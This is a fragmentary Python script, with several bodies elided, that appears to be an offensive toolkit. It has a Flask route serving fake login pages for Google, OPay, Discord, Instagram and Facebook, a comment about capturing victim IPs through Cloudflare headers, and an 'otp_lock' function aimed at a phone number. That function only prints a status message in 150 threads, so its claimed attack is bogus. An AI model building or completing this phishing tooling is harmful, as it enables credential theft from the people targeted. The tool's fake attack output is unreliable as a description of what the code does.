...
def nexo_banner(module="MAIN CORE", link=None):
    ...
    print(f"  {Y}MODULE:\n  {C}{module}")
    if link:
        print(f"  {Y}STRIKE LINK:\n  {G}{link}")
    print(f"{R}" + "═"*50 + f"{W}\n")

# --- [ WEB SERVER HANDLERS ] ---
@app.route('/login/<site>', methods=['GET', 'POST'])
def handle_phish(site):
    # FIX: Capture target IP via Cloudflare headers
...
def start_phish():
    ...
    choice = input(f"\n{C}SELECT SITE NO: \n{W}")
    sites = {
        "1":"google", "2":"opay", "3":"discord", "4":"instagram", "5":"facebook",
...
def otp_lock():
    ...
    if target_num == "NONE SET": target_num = input(f"{Y}[+] NUMBER: \n{W}")
    def attack():
        while True:
            sys.stdout.write(f"\r{G}[*] LOCK ACTIVE: {R}{target_num}")
            sys.stdout.flush()
            time.sleep(0.1)
    for _ in range(150): threading.Thread(target=attack, daemon=True).start()
    input(f"\n\n{R}[ENTER TO STOP]{W}")
